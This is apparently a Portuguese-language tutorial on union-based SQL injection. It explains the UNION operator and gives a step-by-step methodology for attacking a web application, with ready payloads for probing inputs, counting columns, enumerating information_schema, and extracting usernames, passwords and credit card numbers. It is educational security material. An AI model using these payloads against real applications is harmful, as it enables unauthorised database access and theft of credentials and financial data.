

## O que é Union-Based SQLi?

É uma técnica que explora o operador SQL `UNION` para **combinar os resultados de uma query maliciosa** com os resultados da query original da aplicação. Isso permite extrair dados de outras tabelas do banco diretamente na resposta da página.

---

## O operador UNION no SQL

O `UNION` combina os resultados de dois ou mais `SELECT` em um único result set.

**Requisitos obrigatórios:**
- O número de colunas deve ser **igual** em ambos os SELECT
- Os tipos de dados devem ser **compatíveis** entre as colunas correspondentes

---

## Exemplo conceitual

**Query original da aplicação:**
```sql
SELECT id, name FROM users WHERE id = '<user_input>'
```

**Payload injetado:**
```sql
' UNION SELECT credit_card_number, 'hack' FROM credit_cards --
```

**Query resultante executada pelo banco:**
```sql
SELECT id, name FROM users WHERE id = '' UNION SELECT credit_card_number, 'hack' FROM credit_cards --'
```

O `--` no final comenta o restante da query original, evitando erros de sintaxe. O resultado incluirá os números de cartão de crédito junto com os dados originais.

---

## Metodologia passo a passo

### 1. Identificar inputs do usuário

Determinar quais inputs são utilizados em queries SQL:
- Parâmetros de URL
- Campos de formulário
- Cookies
- Qualquer dado controlável pelo usuário

### 2. Testar vulnerabilidade

Injetar payloads simples e observar o comportamento:
- Aspas simples: `'`
- Aspas duplas: `"`
- Condições booleanas: `' OR '1'='1`

Se a aplicação retornar erro ou comportamento inesperado, pode ser vulnerável.

### 3. Determinar o número de colunas

Antes de usar UNION, é necessário saber **quantas colunas** a query original retorna:

**Método ORDER BY:**
```
' ORDER BY 1 --    → OK
' ORDER BY 2 --    → OK
' ORDER BY 3 --    → OK
' ORDER BY 4 --    → ERRO! → A query tem 3 colunas
```

**Método UNION SELECT NULL:**
```
' UNION SELECT NULL --           → ERRO
' UNION SELECT NULL, NULL --     → ERRO
' UNION SELECT NULL, NULL, NULL --  → OK! → 3 colunas
```

### 4. Identificar colunas que aceitam texto

Substituir os NULLs por strings para ver quais colunas são exibidas na página:
```
' UNION SELECT 'a', NULL, NULL --
' UNION SELECT NULL, 'a', NULL --
' UNION SELECT NULL, NULL, 'a' --
```

### 5. Extrair informações do banco

Com o número de colunas e as posições visíveis identificadas, extrair dados:

**Versão do banco:**
```sql
' UNION SELECT version(), NULL, NULL --
```

**Listar databases:**
```sql
' UNION SELECT schema_name, NULL, NULL FROM information_schema.schemata --
```

**Listar tabelas de um database:**
```sql
' UNION SELECT table_name, NULL, NULL FROM information_schema.tables WHERE table_schema='target_db' --
```

**Listar colunas de uma tabela:**
```sql
' UNION SELECT column_name, NULL, NULL FROM information_schema.columns WHERE table_name='users' --
```

**Extrair dados:**
```sql
' UNION SELECT username, password, NULL FROM users --
```

---

## Resumo do fluxo

```
Encontrar input vulnerável
    ↓
Determinar número de colunas (ORDER BY ou UNION NULL)
    ↓
Identificar colunas visíveis na página
    ↓
Extrair versão do banco
    ↓
Enumerar databases → tabelas → colunas
    ↓
Extrair dados sensíveis
```

